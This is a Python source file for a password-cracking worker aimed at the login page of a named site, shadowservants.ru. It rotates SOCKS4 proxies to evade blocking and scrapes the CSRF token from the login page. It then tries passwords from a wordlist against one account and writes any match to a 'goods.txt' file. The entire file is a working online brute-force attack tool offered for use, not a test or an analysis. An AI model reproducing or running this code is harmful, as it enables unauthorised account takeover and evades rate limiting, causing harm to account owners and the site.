from requests import session
import time
import re
import os


class Cracker:
    def __init__(self, proxylist, login, passwords, passwordsids, threadname, staticdata):
        self.threadname = threadname
        self.proxylist = proxylist
        self.login = login
        self.passwords = passwords
        self.passwordsids = passwordsids
        self.counter = 0
        self.last_password = None
        self.proxy = None
        self.staticdata = staticdata
        self.session_get()

    def session_get(self):
        if self.staticdata.Status() == True:
            return

        r = session()
        self.proxy = self.proxylist.pop()

        if len(self.proxylist) == 0:
            print('\n\nI have spent all proxies. Please update them.')
            return

        try:
            r.proxies = {'socks4': 'socks4://' + self.proxy}
            data = r.get('https://shadowservants.ru/login', timeout=5).text
            reg = re.findall(r'<meta name=\"csrf_token\" content=\"[A-Za-z0-9.-]+\" />', data)
            if len(str(reg)) < 3:
                time.sleep(1)
                print('Looks like bad proxy: {} I\'ll repair it.'.format(self.proxy))
                self.session_get()
            csrf = str(reg).split()[2]
            csrf = csrf.split('"')
            csrf = csrf[1].replace('"', '')
            self.auth(r, csrf)
        except:
            time.sleep(1)
            print('Looks like bad proxy: {} I\'ll repair it.'.format(self.proxy))
            self.session_get()

    def auth(self, r, csrf):
        if self.staticdata.Status() == True:
            return

        f = open(self.passwords, 'r', encoding='utf-8')
        password = f.readline()
        while password:
            while True:
                if len(self.passwordsids) < 1 or password is None:
                    return
                if self.passwordsids[0] != self.counter:
                    self.counter += 1
                    password = f.readline()
                else:
                    del (self.passwordsids[0])
                    break
                if len(password) <= 1:
                    return
            password = password.strip()
            password = password.replace('\\n', '')
            try:
                repl = r.post(url='https://shadowservants.ru/login',
                              data={'login': self.login, 'password': password, 'csrf_token': csrf},
                              headers={"referer": "https://shadowservants.ru/login"}, timeout=5)
                if "Неправильный логин или пароль" not in repl.text and "Пользователь неактивен" not in repl.text:
                    try:
                        os.mkdir('./workout/')
                    except:
                        pass
                    try:
                        f = open('./workout/goods.txt', 'a', encoding='utf-8')
                        f.write('Good: ' + self.login + "|" + password + '\n')
                        f.close()
                        self.staticdata.Stop()
                    except:
                        print('\nCan\'t save results. Ok, I just say it here.\n')
                    print("\n\nNicely done! Password for \"{}\" is \"{}\"".format(self.login, password))
                    self.staticdata.Stop()
                    raise KeyboardInterrupt
                else:
                    print('Bad attempt with the "{}" password.'.format(password))
                password = f.readline()
                self.counter += 1
            except KeyboardInterrupt:
                f.close()
                return
            except:
                time.sleep(1)
                print('Looks like bad proxy: {} I\'ll repair it.'.format(self.proxy))
                f.close()
                self.session_get()

        f.close()
